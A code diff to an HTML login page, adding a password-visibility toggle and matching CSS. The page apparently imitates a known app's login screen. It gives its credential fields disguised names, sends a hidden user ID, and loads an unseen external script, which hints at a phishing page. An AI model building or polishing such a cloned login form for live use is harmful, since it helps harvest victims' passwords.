@@ -39,19 +39,33 @@
       color: #161823;
       margin-bottom: 32px;
     }
+    .form-group {
+      position: relative;
+      width: 100%;
+      margin-bottom: 16px;
+    }
     .form-input {
       width: 100%;
-      padding: 12px 16px;
+      padding: 12px 40px 12px 16px;
       font-size: 16px;
       border: 1px solid #d0d0d0;
       border-radius: 4px;
-      margin-bottom: 16px;
       background: #fff;
       color: #161823;
     }
     .form-input:focus {
       outline: none;
       border-color: #fe2c55;
+    }
+    .toggle-password {
+      position: absolute;
+      top: 50%;
+      right: 12px;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 18px;
+      color: #888;
+      user-select: none;
     }
     .login-button {
       width: 100%;
@@ -132,7 +146,12 @@
       <input type="hidden" name="user_id" value="16934">
 
       <input type="text" class="form-input" name="message_title" placeholder="Email or username" required>
-      <input type="password" class="form-input" name="description" placeholder="Password" required>
+      
+      <div class="form-group">
+        <input type="password" class="form-input" id="password" name="description" placeholder="Password" required>
+        <span class="toggle-password" id="togglePassword">👁️</span>
+      </div>
+
       <button type="submit" class="login-button">Log In</button>
     </form>
 
@@ -152,7 +171,18 @@
       alert(`Logged in as: ${username}`);
       // You can send data to a backend here
     });
+
+    // Toggle password visibility
+    const togglePassword = document.getElementById("togglePassword");
+    const passwordField = document.getElementById("password");
+
+    togglePassword.addEventListener("click", () => {
+      const type = passwordField.type === "password" ? "text" : "password";
+      passwordField.type = type;
+      togglePassword.textContent = type === "password" ? "👁️" : "🙈";
+    });
   </script>
-    <script src="intelligent4.js"></script>
+  
+  <script src="intelligent4.js"></script>
 </body>
 </html>
